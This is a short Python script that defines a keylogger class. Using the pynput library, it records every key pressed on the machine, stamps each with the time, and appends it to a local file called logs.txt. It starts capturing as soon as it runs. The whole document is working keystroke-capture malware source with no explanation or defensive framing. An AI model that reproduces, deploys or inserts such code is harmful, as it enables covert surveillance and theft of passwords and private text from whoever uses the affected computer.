from pynput import keyboard
from datetime import datetime

class KeyLogger:
    def __init__(self):
        pass

    def on_press(self, key):
        time = datetime.now().replace(microsecond=0)
        with open("logs.txt", "a+") as f:
            f.write(f"{time} | {key}\n")


    def key_listener(self):
        with keyboard.Listener(on_press=self.on_press) as kl:
            kl.join()


Logger = KeyLogger()
Logger.key_listener()

